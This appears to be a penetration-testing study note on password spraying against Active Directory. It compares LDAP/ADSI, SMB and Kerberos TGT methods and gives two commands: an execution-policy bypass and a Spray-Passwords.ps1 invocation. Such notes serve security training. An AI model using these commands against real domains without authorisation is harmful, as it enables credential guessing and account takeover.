<font size=5>There are 3 approaches:</font>

1) LDAP and ADSI to perform a _low and slow_ password attack against AD users:
	- We can use Spray-Passwords.ps1 to spray passwords on valid users in the domain. The **-Pass** option allows us to set a single password to test, or we can submit a wordlist file using _-File_.
```
powershell -ep bypass
```
```
.\Spray-Passwords.ps1 -Pass [PASSWORD] -Admin
```

2) Leverage SMB:
	- for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy due to the generated network traffic. It is also quite slow in comparison to other techniques.

3) The third kind of password spraying attack we'll discuss is based on obtaining a TGT:
	- The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response.
